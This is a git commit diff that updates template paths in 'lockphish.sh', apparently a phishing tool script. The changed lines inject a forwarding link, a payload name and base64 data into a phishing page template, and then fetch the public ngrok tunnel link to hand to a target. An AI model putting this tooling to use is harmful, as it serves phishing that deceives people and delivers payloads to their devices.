f9bcc33ffd99e18080230307f02246aa8aa69cbd
buingochieuc7 <99152917+buingochieuc7@users.noreply.github.com>
2022-04-05 09:08:33 +0700

    Update lockphish.sh

--- lockphish.sh
+++ lockphish.sh
@@ -169,7 +169,7 @@ temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"
 
 #printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
 #printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
-sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html
+sed 's+forwarding_link+'$link'+g' lockphish-new/template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > lockphish-new/index2.html
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
